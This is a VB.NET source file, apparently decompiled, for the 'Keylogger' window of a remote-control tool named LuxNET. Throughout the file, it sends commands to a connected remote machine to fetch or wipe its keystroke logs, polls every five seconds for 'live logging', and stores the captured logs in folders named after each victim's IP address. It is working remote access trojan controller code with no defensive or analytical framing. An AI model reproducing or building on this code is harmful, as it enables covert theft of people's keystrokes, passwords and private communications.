Imports LuxNET.My
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class Keylogger
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.t = New Timer
        Me.cleared = False
        Me.InitializeComponent()
    End Sub

    Private Sub btn_clear_Click(sender As Object, e As EventArgs) Handles btn_clear.Click
        Me.cleared = True
        Me.rtb_log.Text = ""
        Me.SendPacket(New Object() {CByte(&H18)})
        Me.cleared = False
        Me.Label1.Text = "Status: Logs cleared!"
    End Sub

    Private Sub btn_save_Click(sender As Object, e As EventArgs) Handles btn_save.Click
        Try
            If Not My.Computer.FileSystem.DirectoryExists(String.Format("{0}\Keylogger\", FileSystem.CurDir)) Then
                Directory.CreateDirectory(String.Format("{0}\Keylogger\", FileSystem.CurDir))
            End If
            If Not My.Computer.FileSystem.DirectoryExists(String.Format("{0}\Keylogger\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString)) Then
                Directory.CreateDirectory(String.Format("{0}\Keylogger\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString))
            End If
            Dim strArray As String() = File.ReadAllLines(String.Format("{0}\Keylogger\{1}\{2}.txt", FileSystem.CurDir, Me.client.EndPoint.Address.ToString, DateTime.Today.ToShortDateString))
            Dim list As New List(Of String)
            Dim str As String
            For Each str In strArray
                list.Add(str)
            Next
            Dim str2 As String
            For Each str2 In Me.rtb_log.Lines
                list.Add(str2)
            Next
            File.WriteAllLines(String.Format("{0}\Keylogger\{1}\{2}.txt", FileSystem.CurDir, Me.client.EndPoint.Address.ToString, DateTime.Today.ToShortDateString), list.ToArray)
            Me.Label1.Text = "Logs saved!"
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            If Not My.Computer.FileSystem.DirectoryExists(String.Format("{0}\Keylogger\", FileSystem.CurDir)) Then
                Directory.CreateDirectory(String.Format("{0}\Keylogger\", FileSystem.CurDir))
            End If
            If Not My.Computer.FileSystem.DirectoryExists(String.Format("{0}\Keylogger\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString)) Then
                Directory.CreateDirectory(String.Format("{0}\Keylogger\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString))
            End If
            File.WriteAllLines(String.Format("{0}\Keylogger\{1}\{2}.txt", FileSystem.CurDir, Me.client.EndPoint.Address.ToString, DateTime.Today.ToShortDateString), Me.rtb_log.Lines)
            Me.Label1.Text = "Logs saved!"
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub btn_start_Click(sender As Object, e As EventArgs) Handles btn_start.Click
        Me.t.Interval = &H1388
        Me.t.Start()
        Me.btn_start.Enabled = False
        Me.btn_stop.Enabled = True
        Me.Label1.Text = "Status: Live logging!"
    End Sub

    Private Sub btn_stop_Click(sender As Object, e As EventArgs) Handles btn_stop.Click
        Me.t.Stop()
        Me.btn_start.Enabled = True
        Me.btn_stop.Enabled = False
        Me.Label1.Text = "Status: Idle"
    End Sub

    Private Sub Keylogger_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.rtb_log.ReadOnly = True
        Me.rtb_log.BackColor = Color.White
        Me.SendPacket(New Object() {CByte(&H17)})
        Me.Label1.Text = "Status: Logs received!"
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
    End Sub

    Private Sub t_Tick(sender As Object, e As EventArgs) Handles t.Tick
        Me.SendPacket(New Object() {CByte(&H17)})
    End Sub

    Private cleared As Boolean
    Public client As ServerClient
    Private packer As LuxNET.Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        ClearLogs = &H18
        Getlogs = &H17
    End Enum
End Class